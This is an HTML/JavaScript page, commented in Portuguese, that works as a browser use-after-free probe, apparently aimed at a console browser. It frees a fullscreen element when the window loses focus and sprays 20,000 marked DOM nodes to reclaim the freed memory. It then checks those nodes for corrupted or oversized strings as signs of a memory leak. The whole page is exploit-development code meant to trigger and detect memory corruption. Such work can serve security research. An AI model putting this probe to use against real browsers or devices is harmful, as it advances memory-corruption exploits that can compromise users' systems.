<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF → DOM Leak</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF DOM Leak Probe</h2>
<button onclick="run()">Run</button>

<pre id="log"></pre>

<script>
function log(m){
    document.getElementById("log").textContent += m + "\n";
}

function setupFS(){
    let d = document.createElement("div");
    d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
    d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
    document.body.appendChild(d);
    d.webkitRequestFullscreen();
    return d;
}

// 🔥 RECLAIM AGRESSIVO (igual ao que funcionou)
function aggressiveReclaim() {
    log("[*] reclaim agressivo");

    let nodes = [];

    for (let i = 0; i < 20000; i++) {
        let d = document.createElement("div");

        // padrão identificável
        d.textContent = "LEAK_" + i + "_AAAAAAAAAAAAAAAAAAAA";

        nodes.push(d);
    }

    return nodes;
}

// 🔬 leak probe
function probe(nodes) {
    log("---- PROBE ----");

    for (let i = 0; i < nodes.length; i++) {
        let txt = nodes[i].textContent;

        // 🔥 detectar corrupção
        if (!txt.includes("LEAK_")) {
            log("[!!!] STRING CORROMPIDA");
            log(txt);
            return;
        }

        if (txt.length > 100) {
            log("[!!!] POSSÍVEL LEAK");
            log(txt);
            return;
        }
    }

    log("[OK] nenhuma anomalia detectada");
}

function trigger(fsTarget) {
    log("[*] trigger");

    fsTarget.remove();
    document.webkitExitFullscreen();

    let nodes = aggressiveReclaim();

    setTimeout(() => probe(nodes), 50);

    // 🔴 NÃO MEXER
    setTimeout(() => location.reload(), 500);
}

function run(){
    log("Running... Press OPTIONS");

    let fs = setupFS();

    window.onblur = function(){
        log("[*] onblur");

        setTimeout(() => {
            trigger(fs);
        }, 3000);
    };
}
</script>

</body>
</html>
